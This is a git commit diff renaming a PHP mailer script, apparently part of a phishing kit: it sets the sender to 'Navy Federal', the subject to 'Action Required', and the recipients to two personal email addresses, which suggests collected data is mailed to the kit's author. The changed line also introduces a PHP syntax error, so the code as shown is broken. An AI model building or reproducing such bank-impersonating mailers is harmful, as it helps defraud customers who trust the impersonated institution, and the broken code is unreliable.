5acf561ea7a9b7b52fafa02f88103bb4b50e136e
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-09-23 22:48:10 +0200

    Update and rename mail3.php to mail4.php

--- mail4.php
+++ mail4.php
@@ -1,6 +1,6 @@
 <?php
 $from = "Navy Federal";
-$to = "nwaforalex158@outlook.com,alexjay158@gmail.com";
+$to = "nwaforalex158@outlook.com","alexjay158@gmail.com";
 $subject = "Action Required";
 $message = 'hi' ;
 $headers = "From:" . $from;
